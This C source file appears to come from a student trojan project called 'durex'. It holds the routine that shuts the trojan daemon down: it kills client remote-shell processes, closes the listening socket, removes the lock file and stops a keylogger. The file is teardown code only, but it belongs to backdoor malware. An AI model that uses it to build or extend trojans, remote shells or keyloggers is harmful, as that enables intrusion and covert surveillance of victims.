/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   stop_trojan.c                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/18 16:41:09 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 21:13:18 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <sys/wait.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/file.h>

void			stop_trojan(t_durex *durex)
{
	unsigned int		i;

	log_info(durex, "Stopping daemon\n");
	i = 0;
	while (i < durex->serv.max_fd)
	{
		if (durex->clients[i].type == FD_CLIENT)
			remove_client(durex, i);
        if (durex->clients[i].shell_pid > 0)
		    kill(durex->clients[i].shell_pid, SIGKILL);
		i++;
	}
	close(durex->serv.socket);
	if (durex->daemon.lock > 0 && flock(durex->daemon.lock, LOCK_UN) == -1)
		durex_log(durex, "Could not unlock\n", "ERROR");
	if (durex->daemon.lock > 0)
		close(durex->daemon.lock);
	remove(LOCK_PATH);
	keylog_stop(durex);
	close_logs(durex);
	exit(EXIT_SUCCESS);
}
